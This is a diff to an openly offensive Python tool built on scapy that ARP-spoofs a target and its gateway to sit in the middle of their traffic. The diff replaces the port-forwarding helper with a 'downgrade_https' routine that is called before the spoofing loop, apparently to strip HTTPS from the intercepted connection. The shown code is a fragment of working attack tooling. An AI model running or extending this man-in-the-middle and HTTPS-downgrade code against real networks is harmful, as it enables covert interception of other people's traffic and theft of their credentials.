@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 # Author: Matthew Zito (goldmund) 
 # Contact: https://www.github.com/MatthewZito
@@ -11,13 +11,12 @@ intermediary entity between the given client/gateway. Port-forwarding
 is auto-enabled, and both client and gateway ARP tables are reset
 upon user-termination.
 """
-
 import scapy.all as scapy
 import time
 import sys
 import subprocess
 from subprocess import Popen
-from utils.enable_port_fwd import enable_port_fwd
+from utils.downgrade_https import downgrade_https
 
 class Spoofer:
     def __init__(self, target_ip, gateway_ip):
@@ -55,7 +54,7 @@ class Spoofer:
         scapy.send(arp_packet, count=4, verbose=False)
 
     def run(self):
-        enable_port_fwd()
+        downgrade_https()
         sent_packets_count = 0
         while True:
             self.spoof(self.target_ip, self.gateway_ip, self.target_mac) # client, I am the router
